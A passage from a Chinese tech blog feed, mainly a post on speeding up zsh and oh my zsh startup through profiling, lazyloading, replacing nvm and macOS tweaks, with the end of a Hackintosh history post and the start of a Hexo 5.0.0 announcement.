PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\"> <div class=\"license-title\">黑苹果的历史</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-09-02</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span 